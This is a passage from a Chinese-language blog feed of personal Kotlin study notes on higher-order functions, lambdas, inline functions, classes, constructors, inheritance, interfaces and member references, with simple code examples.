<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>一个函数如果参数类型是函数或者返回值类型是函数，那么这就是一个高阶函数。</p>
<h3 id="函数类型其实就是将函数的-“参数类型”-和-“返回值类型”-抽象出来"><a href="#函数类型其实就是将函数的-“参数类型”-和-“返回值类型”-抽象出来" class="headerlink" title="函数类型其实就是将函数的 “参数类型” 和 “返回值类型” 抽象出来"></a>函数类型其实就是将函数的 “参数类型” 和 “返回值类型” 抽象出来</h3><p>例如:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> add(a:<span class="built_in">Int</span>,b:<span class="built_in">Int</span>) = a+b</span><br></pre></td></tr></table></figure>
<p>他的函数类型就是<code>(Int,Int)-&gt;Int</code><br>而高阶函数意味着他而已接受一个函数的参数，或者他返回一个函数。<br>例如：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在以下main函数中，将show函数传递给了showUserName作为参数使用。</span></span><br><span class="line"><span class="comment">//除了可以使用已存在的函数，也可以现写一个函数</span></span><br><span class="line"><span class="comment">//同样的，可以用lambda语法来写函数</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    showUserName(<span class="string">&quot;zfxt&quot;</span>,::show)</span><br><span class="line">    <span class="comment">//showUserName(&quot;zfxt&quot;,fun(s:String)&#123;println(s)&#125;)</span></span><br><span class="line">    <span class="comment">//showUserName(&quot;zfxt&quot;,&#123;s:String-&gt;println(s)&#125;)</span></span><br><span class="line"><span class="comment">//过长的lambda语法函数可以写在（）外面，如下</span></span><br><span class="line"><span class="comment">//showUserName(&quot;zfxt&quot;) &#123;s:String-&gt;println(s)&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span>  <span class="title">show</span><span class="params">(s: <span class="type">String</span>)</span></span> = println(s)</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">showUserName</span><span class="params">(name:<span class="type">String</span>,show:(<span class="type">String</span>)-&gt;<span class="type">Unit</span>)</span></span>&#123;</span><br><span class="line">    show(name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="内联函数（inline）"><a href="#内联函数（inline）" class="headerlink" title="内联函数（inline）"></a>内联函数（inline）</h2><p>一般情况下，调用函数。也就是将程序执行顺序转移到内存中存放该函数的位置，执行完后，再返回现场重新执行原本的内容。其中转换过程都是采用压栈和出栈的方式。而对于那些频繁调用的函数，将会有很大的时间和空间开销，因此使用内联函数，他的作用就是将函数体直接放在主进程内。用空间开销换时间开销。</p>
<ul>
<li>支持 return 退出函数</li>
<li>禁止内联：<code>noinline</code><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 main() 中调用 makeTest()</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Log.i(<span class="string">&quot;zc_test&quot;</span>, <span class="string">&quot;main() start&quot;</span>)</span><br><span class="line">    makeTest()</span><br><span class="line">    Log.i(<span class="string">&quot;zc_test&quot;</span>, <span class="string">&quot;main() end&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 内联函数 makeTest()</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="title">makeTest</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Log.i(<span class="string">&quot;zc_test&quot;</span>, <span class="string">&quot;makeTest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>他是定义匿名函数的简单形式</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> sum = &#123;x:<span class="built_in">Int</span>,y:<span class="built_in">Int</span> -&gt; x+y&#125;</span><br></pre></td></tr></table></figure>
<p>其中，参数声明放在<code>-&gt;</code>前面，函数体放在<code>-&gt;</code>后面<br>还可以将可选标注先留下</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> sum:(<span class="built_in">Int</span>,<span class="built_in">Int</span>)-&gt;<span class="built_in">Int</span> = &#123;x,y-&gt;x+y&#125;</span><br></pre></td></tr></table></figure>
<p>在kotlin中，如果一个函数的最后一个参数是lambda表达式，那么可以直接将表达式写在括号外面。<br>如果只有一个参数，那么直接省略小括号。
  </p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 协程与互操作</title>
    <url>/posts/2367fd91/</url>
    <content><![CDATA[<p>暂存问题<br>协程，kotlin和java互操作，kotlin和js互操作。委托。泛型。<br>（最后两个可以暂时不用考虑）互操网上再学习</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 类与对象概要</title>
    <url>/posts/838a94ca/</url>
    <content><![CDATA[<h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><p>用class声明<br>可以像普通函数一样使用构造函数创建类。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> site = Runoob() <span class="comment">// Kotlin 中没有 new 关键字</span></span><br></pre></td></tr></table></figure>
<p>要使用类中的属性直接用<code>.</code>来引用即可。</p>
<h2 id="主构造器，直接作为类头部的一部分，位于类名后。"><a href="#主构造器，直接作为类头部的一部分，位于类名后。" class="headerlink" title="主构造器，直接作为类头部的一部分，位于类名后。"></a>主构造器，直接作为类头部的一部分，位于类名后。</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">constructor</span>(firstName: String) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>如果没有特别的注解可以省略<code>contstructor</code>的关键字。<br>如果构造器有注解，或者有可见度修饰符，这时constructor关键字是必须的，注解和修饰符要放在它之前。</p>
<h3 id="getter和setter"><a href="#getter和setter" class="headerlink" title="getter和setter"></a>getter和setter</h3><p>默认会实现getter方法和setter方法，val不会有setter方法。<br>field指的就是存储在属性中的值。<br>field 关键词只能用于属性的访问器<br>示例：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lastName: String = <span class="string">&quot;zhang&quot;</span></span><br><span class="line">        <span class="keyword">get</span>() = field.toUpperCase()   <span class="comment">// 将变量赋值后转换为大写</span></span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> no: <span class="built_in">Int</span> = <span class="number">100</span></span><br><span class="line">        <span class="keyword">get</span>() = field                <span class="comment">// 后端变量</span></span><br><span class="line">        <span class="keyword">set</span>(value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &lt; <span class="number">10</span>) &#123;       <span class="comment">// 如果传入的值小于 10 返回该值</span></span><br><span class="line">                field = value</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                field = -<span class="number">1</span>         <span class="comment">// 如果传入的值大于等于 10 返回 -1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> heiht: <span class="built_in">Float</span> = <span class="number">145.4f</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">set</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> person: Person = Person()</span><br><span class="line"></span><br><span class="line">    person.lastName = <span class="string">&quot;wang&quot;</span></span><br><span class="line"></span><br><span class="line">    println(<span class="string">&quot;lastName:<span class="subst">$&#123;person.lastName&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    person.no = <span class="number">9</span></span><br><span class="line">    println(<span class="string">&quot;no:<span class="subst">$&#123;person.no&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    person.no = <span class="number">20</span></span><br><span class="line">    println(<span class="string">&quot;no:<span class="subst">$&#123;person.no&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的get，set方法也都可以设置为public或者private。</p>
<h3 id="class类中，如果属性不是在主构造器中定义的，必须有初始化，或者lateinit属性。"><a href="#class类中，如果属性不是在主构造器中定义的，必须有初始化，或者lateinit属性。" class="headerlink" title="class类中，如果属性不是在主构造器中定义的，必须有初始化，或者lateinit属性。"></a>class类中，如果属性不是在主构造器中定义的，必须有初始化，或者<code>lateinit</code>属性。</h3><h3 id="lateinit"><a href="#lateinit" class="headerlink" title="lateinit"></a>lateinit</h3><p>允许延迟初始化</p>
<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>初始化代码，允许放在初始代码段中。用<code>init</code>关键字作为前缀</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">constructor</span>(firstName: String) &#123;</span><br><span class="line">    <span class="keyword">init</span> &#123;</span><br><span class="line">        println(<span class="string">&quot;FirstName is <span class="variable">$firstName</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="次构造函数"><a href="#次构造函数" class="headerlink" title="次构造函数"></a>次构造函数</h2><p>次构造函数必须加前缀<code>constructor</code><br>如果类有主构造函数，那么每个次构造函数必须直接或间接代理主构造函数，可以理解为继承。<br>例如：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="keyword">val</span> name: String) &#123;</span><br><span class="line">    <span class="keyword">constructor</span> (name: String, age:<span class="built_in">Int</span>) : <span class="keyword">this</span>(name) &#123;</span><br><span class="line">        <span class="comment">// 初始化...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><em><strong>注意：在 JVM 虚拟机中，如果主构造函数的所有参数都有默认值，编译器会生成一个附加的无参的构造函数，这个构造函数会直接使用默认值。这使得 Kotlin 可以更简单的使用像 Jackson 或者 JPA 这样使用无参构造函数来创建类实例的库。</strong></em></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Customer</span>(<span class="keyword">val</span> customerName: String = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><em><strong>对象的属性必须用var或者val表明出来，当然它也可以简写在主构造器中，可以简单的表示出来。如果没用var或者val修饰，那么他只是一个普通的参数，而不是一个对象的属性。而且只有主构造器才可以这样直接声明属性，次构造器不允许这样子使用</strong></em></p>
</blockquote>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 继承与重写</title>
    <url>/posts/6bfa3df5/</url>
    <content><![CDATA[<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>kotlin中所有的类都继承自Any类，他是所有类的超类。<br>Any 默认提供了三个函数：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">equals()</span><br><span class="line"></span><br><span class="line">hashCode()</span><br><span class="line"></span><br><span class="line">toString()</span><br></pre></td></tr></table></figure>
<p>在kotlin中，父类被定义为基类。<br>如果子类有主构造函数，那么子类在主构造函数时，就要初始化父类的属性。<br>如果子类是使用次构造函数，那么通过<code>super</code>标签继承父类的构造函数，可以是父类的主构造函数，也可以是次构造函数。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> : <span class="type">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(ctx: Context) : <span class="keyword">super</span>(ctx) &#123;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(ctx: Context, attrs: AttributeSet) : <span class="keyword">super</span>(ctx,attrs) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><p>在基类中，使用fun声明函数时，此函数默认为final修饰，不能被子类重写。如果允许子类重写该函数，那么就要手动添加 open 修饰它, 子类重写方法使用 override 关键词：<br>可以用var重写一个val的属性，但是不能用val重写一个var的属性，因为val不具备setter方法，无法正确继承并重写。</p>
<p>子类重写父类的方法时，是可以继承其函数体的，通过<code>super</code>来实现。<br>例如：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">()</span></span> &#123; print(<span class="string">&quot;A&quot;</span>) &#125;   <span class="comment">// 已实现</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">bar</span><span class="params">()</span></span>                  <span class="comment">// 未实现，没有方法体，是抽象的</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">()</span></span> &#123; print(<span class="string">&quot;B&quot;</span>) &#125;   <span class="comment">// 已实现</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">bar</span><span class="params">()</span></span> &#123; print(<span class="string">&quot;bar&quot;</span>) &#125; <span class="comment">// 已实现</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="type">A</span> &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">bar</span><span class="params">()</span></span> &#123; print(<span class="string">&quot;bar&quot;</span>) &#125;   <span class="comment">// 重写</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="type">A</span>, <span class="type">B</span> &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>&lt;A&gt;.foo()</span><br><span class="line">        <span class="keyword">super</span>&lt;B&gt;.foo()</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">bar</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>&lt;B&gt;.bar()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> d =  D()</span><br><span class="line">    d.foo();</span><br><span class="line">    d.bar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 语言特性：DTO、默认参数、集合操作</title>
    <url>/posts/70f6f63b/</url>
    <content><![CDATA[<h2 id="创建-DTO-（POJO-POCO）"><a href="#创建-DTO-（POJO-POCO）" class="headerlink" title="创建 DTO （POJO&#x2F;POCO）"></a>创建 DTO （POJO&#x2F;POCO）</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Customer</span>(<span class="keyword">val</span> name: String, <span class="keyword">val</span> email: String)</span><br></pre></td></tr></table></figure>
<p>会为 Customer 类提供以下功能：</p>
<p>所有属性的 getter （对于 var 定义的还有 setter）</p>
<ul>
<li>equals()</li>
<li>hashCode()</li>
<li>toString()</li>
<li>copy()</li>
<li>所有属性的 component1()、 component2()……等等</li>
</ul>
<h3 id="可以设置函数的默认参数-同样该默认参数也可以设置在类中。"><a href="#可以设置函数的默认参数-同样该默认参数也可以设置在类中。" class="headerlink" title="可以设置函数的默认参数,同样该默认参数也可以设置在类中。"></a>可以设置函数的默认参数,同样该默认参数也可以设置在类中。</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">(a: <span class="type">Int</span> = <span class="number">0</span>, b: <span class="type">String</span> = <span class="string">&quot;&quot;</span>)</span></span> &#123; …… &#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤list列表"><a href="#过滤list列表" class="headerlink" title="过滤list列表"></a>过滤list列表</h3><p>使用filter方法。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> positives = list.filter &#123; x -&gt; x &gt; <span class="number">0</span> &#125;</span><br><span class="line"><span class="comment">//或者更短</span></span><br><span class="line"><span class="keyword">val</span> positives = list.filter &#123; it &gt; <span class="number">0</span> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="map的使用方法"><a href="#map的使用方法" class="headerlink" title="map的使用方法"></a>map的使用方法</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> map = mapOf(<span class="string">&quot;a&quot;</span> to <span class="number">1</span>, <span class="string">&quot;b&quot;</span> to <span class="number">2</span>, <span class="string">&quot;c&quot;</span> to <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h3 id="访问map条目"><a href="#访问map条目" class="headerlink" title="访问map条目"></a>访问map条目</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">print(map[<span class="string">&quot;key&quot;</span>])</span><br><span class="line">map[<span class="string">&quot;key&quot;</span>] = value</span><br></pre></td></tr></table></figure>
<h2 id="区间迭代"><a href="#区间迭代" class="headerlink" title="区间迭代"></a>区间迭代</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">1.</span><span class="number">.100</span>) &#123; …… &#125;  <span class="comment">// 闭区间：包含 100</span></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">1</span> until <span class="number">100</span>) &#123; …… &#125; <span class="comment">// 半开区间：不包含 100</span></span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">in</span> <span class="number">2.</span><span class="number">.10</span> step <span class="number">2</span>) &#123; …… &#125;</span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">in</span> <span class="number">10</span> downTo <span class="number">1</span>) &#123; …… &#125;</span><br><span class="line">(<span class="number">1.</span><span class="number">.10</span>).forEach &#123; …… &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin中的抽象、内部类、接口及修饰符</title>
    <url>/posts/322eea29/</url>
    <content><![CDATA[<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>用<code>abstarct</code>来声明一个类为抽象类。<br>嵌套类即为类内部的内部类。<br>用<code>inner</code>来比奥是要给内部类。<br>内部类有个对外部的对象的引用，所以内部类可以访问成员属性和成员函数。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> bar: <span class="built_in">Int</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> v = <span class="string">&quot;成员属性&quot;</span></span><br><span class="line">    <span class="comment">/**嵌套内部类**/</span></span><br><span class="line">    <span class="keyword">inner</span> <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">()</span></span> = bar  <span class="comment">// 访问外部类成员</span></span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">innerTest</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">var</span> o = <span class="keyword">this</span><span class="symbol">@Outer</span> <span class="comment">//获取外部类的成员变量</span></span><br><span class="line">            println(<span class="string">&quot;内部类可以引用外部类的成员，例如：&quot;</span> + o.v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inner类属于私有类，私有类不允许在主构造器中使用lateinit属性。</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口的属性需要自己定义get，set方法，他不会帮你定义。<br>接口中的成员变量默认为open的，可以被重写和继承<br>在kotlin的接口中，他的方法是可以拥有方法体的。<br>但是接口中的属性只能是抽象的，不允许初始化值，实现接口时，必须重写属性。<br>或者如果初始化，必须完善他的get和set方法，因为他不会提供set和get方法。</p>
<h2 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h2><ul>
<li>classModifier: 类属性修饰符，标示类本身特性。<br>abstract    &#x2F;&#x2F; 抽象类<br>final       &#x2F;&#x2F; 类不可继承，默认属性<br>enum        &#x2F;&#x2F; 枚举类<br>open        &#x2F;&#x2F; 类可继承，类默认是final的<br>annotation  &#x2F;&#x2F; 注解类</li>
<li>accessModifier: 访问权限修饰符<br>private    &#x2F;&#x2F; 仅在同一个文件中可见<br>protected  &#x2F;&#x2F; 同一个文件中或子类可见<br>public     &#x2F;&#x2F; 所有调用的地方都可见<br>internal   &#x2F;&#x2F; 同一个模块中可见</li>
</ul>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin(lambda函数）</title>
    <url>/posts/19762a99/</url>
    <content><![CDATA[<h2 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h2><h3 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h3><p><img src="https://image.zfxt.top/hexo-blog/Kotlin(lambda%E5%87%BD%E6%95%B0%EF%BC%89-2023-07-16-33-36.png"><br>根据图片可以比较清晰的了解lambda的语法，他通过<code>-&gt;</code>将参数和函数体分开，<strong>参数不用带小括号</strong>，整体都用一个中括号括起来，箭头右边写函数体，函数体可以写多行，最后一行做为表达式的值传递回去。<br>为了让你加深理解。</p>
<ul>
<li>实例1：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">(args: Array&lt;String&gt;)</span> &#123;</span><br><span class="line">    <span class="comment">//&#123;x:Int,y:Int -&gt; x+y&#125;本身就是一个函数</span></span><br><span class="line">    println(&#123;x:Int,y:Int -&gt; x+y&#125;(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
以上内容，肯定了lambda函数表达式，他本身就是一个函数，可以直接使用。像一个正常函数一样。<br>但是这样子意义不大，就像是刻意为之</li>
<li>实例2：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">(args: Array&lt;String&gt;)</span> &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">sum</span> <span class="operator">=</span> &#123;x:Int,y:Int -&gt; x+y&#125;</span><br><span class="line">    println(sum(<span class="number">1</span>,<span class="number">3</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
kotlin作为函数式编程语言。他可以直接把函数传递给一个变量存储。而且该变量可以被其他类，函数所接受。这也是kotlin的一大特点之一。这个被保存到函数同样可以像正常函数一样使用。</li>
</ul>
<h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>通常使用lambda函数有一些特点<br>0. 如果传递进去的参数类型是可知的，可以直接省略掉该参数的类型声明，而直接交给编译器，自动推导</p>
<ol>
<li>如果只有一个参数，那么这个参数可以直接省略，用<code>it</code>来代替</li>
<li>如果函数被作为一个方法的参数，而且是最后一个参数，那么这个函数可以被写在小括号后面，单独列出来。</li>
<li>如果一个类或者一个方法接受一个函数作为变量，而且只接受一个变量，那么可以直接省略小括号，直接放lambda函数上去（当然，不用lambda也行，用其他的函数体）</li>
</ol>
<h3 id="在作用域中访问变量"><a href="#在作用域中访问变量" class="headerlink" title="在作用域中访问变量"></a>在作用域中访问变量</h3><p>在kotlin中，他的lambda函数不仅可以获取到局部变量，还可以修改这个局部变量。我们称这些变量被lambda捕捉</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">(args: Array&lt;String&gt;)</span> &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">num0</span> <span class="operator">=</span> <span class="string">&quot;测试获取val数据&quot;</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">add</span> <span class="operator">=</span> &#123;</span><br><span class="line">        println(num0)</span><br><span class="line">        num1++</span><br><span class="line">    &#125;</span><br><span class="line">    repeat(<span class="number">4</span>) &#123;</span><br><span class="line">        println(num1)</span><br><span class="line">        add()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>展现结果为：<br><img src="https://image.zfxt.top/hexo-blog/Kotlin(lambda%E5%87%BD%E6%95%B0%EF%BC%89-2023-07-09-15-38.png"><br>实现细节：</p>
<ol>
<li>首先，在java中，他只允许你捕捉final变量，也就是kotlin中的val变量，他们不可被修改，只能读取。</li>
<li>当你捕捉val变量时，系统会将这个值和lambda代码一起存储。</li>
<li>当你要捕获var变量，并进行更改时，他会采用两种方法之一，要么声明一个单元素的数组，其中存放可变值。或者创建一个包装类的实例，把这个var变量作为该实例的一个属性，而且可以修改。<br><img src="https://image.zfxt.top/hexo-blog/Kotlin(lambda%E5%87%BD%E6%95%B0%EF%BC%89-2023-07-16-41-31.png"><br>在上述图片中，第一段代码就是对第二段代码的解释。<br>当kotlin中捕获一个var变量时，他会创建一个val的包装类，然后存储该包装类的实例，而这个包装类因为时val的，所以很好获取。</li>
</ol>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>如果 lambda 被用作事件处理器或者用在其他异步执行的情况，对局部变量的修改只会在 lambda 执行的时候发生。<br>意思是说，如果你这个lambda函数作为异步处理的，所以你修改的这个局部变量最好能够通过其他类，或者全局保存。不然他将无法修改成功。</p>
<h3 id="成员引用"><a href="#成员引用" class="headerlink" title="成员引用"></a>成员引用</h3><p>他的使用场景是，当你需要把一个已经定义好的函数抠下来，作为一个参数传递给其他需要使用这个函数参数的地方。<br><img src="https://image.zfxt.top/hexo-blog/Kotlin(lambda%E5%87%BD%E6%95%B0%EF%BC%89-2023-07-01-21-57.png"><br>这种表达式称为成员引用，用双冒号把你要引用的成员（一个属性或者一个方法）和类名称隔开。</p>
<blockquote>
<p>如果是顶层函数，可以直接用::方法名获取</p>
</blockquote>
<p><strong>构造方法</strong><br>可以用构造方法引用 存储或者延期执行创建类实例的动作 构造方法引用的形式，是在双冒号后指定类名称：<br>不难理解，所以直接跳过</p>
<h3 id="详解成员引用"><a href="#详解成员引用" class="headerlink" title="详解成员引用"></a>详解成员引用</h3><p><strong>成员引用和调用该函数的 lambda 具有一样的类型，所以可以互换使用：</strong>这句话请深刻记忆，他很重要。</p>
<h4 id="顶层函数"><a href="#顶层函数" class="headerlink" title="顶层函数"></a>顶层函数</h4><p>直接从顶层方法中获取的方法，他不需要再接受额外的参数，可以直接通过run方法去执行他的函数体，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">salute</span><span class="params">()</span> = println(<span class="string">&quot;Salute !&quot;</span>)</span><br><span class="line">···</span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	salute()</span><br><span class="line">	run(::salute)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两个语句的执行结果一致，都会输出<code>Salute !</code>。<br>如果这个函数有参数的话，而run方法默认是不带参数的。<br>源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@kotlin</span>.internal.InlineOnly</span><br><span class="line"><span class="keyword">public</span> inline fun &lt;R&gt; run(block: () -&gt; R): R &#123;</span><br><span class="line">    contract &#123;</span><br><span class="line">        callsInPlace(block, InvocationKind.EXACTLY_ONCE)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> block()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此可以通过其他方法，比如用一个参数去接受函数体，然后像正常函数一样执行。</p>
<h4 id="非顶层函数"><a href="#非顶层函数" class="headerlink" title="非顶层函数"></a>非顶层函数</h4><p>如果是某个类中的函数，那么他会有一个限制。<br>那就是如果你要使用这个函数的话，他一定需要传入一个他该类的实例进去，不然就会语法报错。<br>例如：</p>
